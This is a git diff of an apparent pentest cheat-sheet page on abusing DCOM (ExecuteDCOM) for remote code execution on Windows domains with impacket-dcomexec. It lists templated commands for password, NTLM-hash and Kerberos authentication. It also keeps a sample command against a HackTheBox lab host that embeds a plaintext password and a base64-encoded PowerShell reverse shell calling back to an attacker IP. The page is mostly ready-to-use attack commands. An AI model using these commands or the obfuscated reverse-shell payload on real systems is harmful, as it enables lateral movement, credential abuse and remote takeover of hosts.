@@ -1,21 +1,43 @@
 ---
 title: "ExecuteDCOM"
-tags: ["Executedcom", "Active Directory", "Windows", "RCE"]
+tags: ["Active Directory", "ExecuteDCOM", "Executedcom", "RCE", "Windows"]
 ---
+
+{{< filter_buttons >}}
 
 ### Abuse #1: ExecuteDCOM
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-```console
-# Revshell
-impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<POWERSHELL_3_BASE64>' -silentcommand -object MMC20
+```console {class="password"}
+# Password
+impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<CMD>' -silentcommand -object MMC20
 ```
 
 ```console {class="sample-code"}
 $ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -silentcommand -object MMC20 
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-dcomexec '<DOMAIN>/<USER>@<TARGET>' '<CMD>' -hashes <HASH> -silentcommand -object MMC20
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-dcomexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' '<CMD>' -k -silentcommand -object MMC20
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-dcomexec '<DOMAIN>/<USER>@<TARGET>' '<CMD>' -hashes <HASH> -k -silentcommand -object MMC20
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-dcomexec '<DOMAIN>/<USER>@<TARGET>' '<CMD>' -k -silentcommand -object MMC20
 ```
 
 {{< /tabcontent >}}
